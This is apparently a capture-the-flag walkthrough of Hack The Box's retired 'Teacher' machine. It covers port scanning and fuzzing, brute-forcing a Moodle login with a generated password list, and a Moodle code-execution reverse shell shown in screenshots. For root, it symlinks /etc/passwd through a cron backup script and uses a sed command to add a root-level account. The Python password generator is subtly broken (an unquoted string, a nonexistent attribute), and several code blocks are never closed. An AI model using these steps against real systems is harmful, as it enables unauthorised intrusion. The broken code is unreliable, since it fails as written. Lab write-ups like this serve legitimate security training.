## Background

Teacher is a retired vulnerable VM from Hack The Box.

## Information Gathering

Letâ€™s start with a `nmap` scan to establish the available services in the host.

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 10.10.10.153
...
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.25 ((Debian))
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Blackhat highschool
```

`nmap` finds `80/tcp` open. Let's go with that.

## Directory/File Enumeration

Based on my experience, it's always good to run some kind of fuzzing when faced with a lack of hints. Let's run `wfuzz` and SecList's `common.txt`, and see what we can find.

```
# wfuzz -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 20 --hc 404 http://10.10.10.153/FUZZ

The site is running Moodle. [Moodle](https://github.com/moodle/moodle) is the world's open source learning platform. Moodle has its fair share of SQLi and RCE vulnerabilities but would require authenticated access.

While I was hunting around for a credential, something caught my eye at the Teacher's gallery page.

I got double F's! Something funky is going on here...

`5.png` is not an image. It's a text file.

Gotcha!

It's easy to generate a password list for brute-forcing the Moodle login form. You can do it with Python like so.

```python
import string

charset = string.ascii_letters + string.digits + string.punctuations

f = open('passwords.txt', 'w')
s = Th4C00lTheacha
t = ''

for c in charset:
  t += s + c + '\n'

f.write(t)
f.close()
```

Once the password list is generated, we can use `wfuzz` to brute-force it.

```
# wfuzz -w passwords.txt --hh 440 -t 20 -d "anchor=&username=giovanni&password=FUZZ" http://10.10.10.153/moodle/login/index.php

## Low-Privilege Shell

Following the instructions from this [post](https://blog.ripstech.com/2018/moodle-remote-code-execution/), I was able to execute a reverse shell back to me.

First, create a calculated question like so.

<a class="image-popup">
![4cd4b5a0.png](/assets/images/posts/teacher-htb-walkthrough/4cd4b5a0.png)
</a>

Create the formula like so.

<a class="image-popup">
![ef16f0d5.png](/assets/images/posts/teacher-htb-walkthrough/ef16f0d5.png)
</a>

Then execute remote commands on the host to run a reverse shell back to me using `nc`.

<a class="image-popup">
![213a07a8.png](/assets/images/posts/teacher-htb-walkthrough/213a07a8.png)
</a>

There you have it, a low-privilege shell.

<a class="image-popup">
![400efef7.png](/assets/images/posts/teacher-htb-walkthrough/400efef7.png)
</a>

Let's upgrade our shell with a pseudo-TTY using Python and then `stty raw -echo; fg; reset`.

## Privilege Escalation

I'm aware that Moodle connects to a database backend to store all the good stuff. The database settings are in `config.php` at the Moodle directory.

<a class="image-popup">
![30e91902.png](/assets/images/posts/teacher-htb-walkthrough/30e91902.png)
</a>

Let's connect to the database.

<a class="image-popup">
![b4d16fec.png](/assets/images/posts/teacher-htb-walkthrough/b4d16fec.png)
</a>

Cracking the MD5 hash is easy.

<a class="image-popup">
![1dc2b446.png](/assets/images/posts/teacher-htb-walkthrough/1dc2b446.png)
</a>

This is the password to `giovanni`'s account. `user.txt` is in the home directory.

<a class="image-popup">
![2a856c44.png](/assets/images/posts/teacher-htb-walkthrough/2a856c44.png)
</a>

During enumeration of `giovanni`'s account, I noticed the pressence of `work` directory and `/usr/bin/backup.sh` referred to it.

<a class="image-popup">
![dc87e44b.png](/assets/images/posts/teacher-htb-walkthrough/dc87e44b.png)
</a>

If I had to guess, I would say this is inside a `cron` job ran with `root` privileges since `giovanni` has no permissions to edit it.

But, look at the last line. It changes the permissions of any file to `rwxrwxrwx`. What if I put a symbolic link to `/etc/passwd` in it?

<a class="image-popup">
![39075b90.png](/assets/images/posts/teacher-htb-walkthrough/39075b90.png)
</a>

Boom! Anyone can edit `/etc/passwd`. Let's give ourselves `root` access.

```
$ sed -r '1h;x;2s/root:x/toor:to5bce5sr7eK6/' /etc/passwd > /tmp/passwd
$ cp /tmp/passwd /etc/passwd
```

<a class="image-popup">
![7a326bec.png](/assets/images/posts/teacher-htb-walkthrough/7a326bec.png)
</a>

With a `root` shell, getting `root.txt` is a breeze.
